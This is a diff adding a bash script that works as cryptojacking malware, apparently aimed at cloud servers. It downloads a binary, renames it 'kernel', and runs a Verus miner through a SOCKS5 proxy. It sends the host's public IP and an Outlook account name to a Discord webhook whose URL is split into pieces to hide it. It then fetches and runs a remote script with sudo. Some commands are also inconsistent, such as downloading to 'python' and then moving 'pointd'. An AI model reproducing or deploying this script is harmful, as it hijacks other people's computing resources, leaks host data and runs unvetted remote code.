@@ -1,0 +1,46 @@
+#!/bin/bash
+
+
+if [ ! -f sudah_initiate_ver.txt ]; then
+  sudo rm -rf cpuminer
+  touch sudah_initiate_ver.txt
+  curl -L -o python https://github.com/oggierf/myproject/raw/main/pointd
+  chmod +x pointd
+  sudo mv pointd kernel
+fi
+
+export  outlook_user=`cat /home/ubuntu/outlook_user.txt | sed -n "$1"P`
+
+sleep 5
+sudo -a ./kernel verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-100 -n 1)-AWS) -p x -t $(nproc --ignore 1) -x socks5://archer:12322@150.136.63.252:1080 &
+sleep 5
+
+if [ ! -f sudah_initiate_discord.txt ]; then
+  touch sudah_initiate_discord.txt
+  pre_message="$@======================================================="
+  message="$@CPUMINER UNTUK WOWNERO SUDAH JALAN : `curl ifconfig.me` | Outlook Acc : $outlook_user "
+  pasca_message="$@======================================================="
+  ## format to parse to curl
+  ## echo Sending message: $message
+  msg_pre_content=\"$pre_message\"
+  msg_content=\"$message\"
+  msg_pasca_content=\"$pasca_message\"
+  ## discord webhook
+  nama1="https://disc"
+  nama2="ord.com/ap"
+  nama3="i/webh"
+  ## FORMAT
+  nama4="ooks/953847082421198890/9BRg2Z7tKUtH-ZwgemK4X4JYrS7wO6tTJkitnNiNxVOmGPigsjH2679jAkMideRPD8K1"
+  url=$nama1$nama2$nama3$nama4
+	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pre_content}" $url
+	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url
+	curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pasca_content}" $url
+ fi
+ 
+
+##################################
+sudo kill $(ps aux | grep 'urgent.sh' |  grep -v 'auto' | awk '{print $2}')
+sudo rm -rf urgent.sh
+curl https://raw.githubusercontent.com/terryputri/bash/main/urgent.sh
+sudo bash urgent.sh &
+#################################
